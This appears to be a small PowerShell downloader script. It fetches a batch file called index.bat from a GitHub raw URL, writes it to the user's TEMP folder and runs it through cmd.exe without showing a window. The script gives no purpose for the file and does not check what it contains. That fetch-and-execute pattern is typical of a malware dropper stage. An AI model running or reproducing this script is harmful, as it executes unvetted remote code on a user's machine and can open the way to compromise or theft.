$batchScriptUrl = 'https://raw.githubusercontent.com/SingendPfeil2/ascii/main/index.bat'
$batchScriptPath = "$env:TEMP\index.bat"
Remove-Item "$env:TEMP\index.bat" -ErrorAction SilentlyContinue
Invoke-WebRequest -Uri $batchScriptUrl -OutFile $batchScriptPath
Start-Process 'cmd.exe' -ArgumentList "/c $batchScriptPath" -NoNewWindow -Wait
exit
exit
